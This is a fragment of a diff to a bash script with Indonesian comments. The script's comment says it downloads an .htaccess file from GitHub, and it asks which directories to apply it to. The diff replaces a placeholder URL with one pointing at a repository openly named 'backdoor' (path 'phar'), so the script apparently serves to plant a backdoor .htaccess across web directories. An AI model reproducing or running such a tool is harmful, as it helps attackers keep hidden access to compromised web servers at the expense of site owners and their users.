@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # URL RAW GitHub yang berisi .htaccess
-HTACCESS_URL="https://raw.githubusercontent.com/username/repo/branch/path/to/.htaccess"
+HTACCESS_URL="https://raw.githubusercontent.com/letsr00t/backdoor/refs/heads/main/phar"
 
 # Minta input dari user
 read -p "Masukkan directory yang mau di-htaccess (pisahkan dengan spasi): " -a TARGET_DIRS
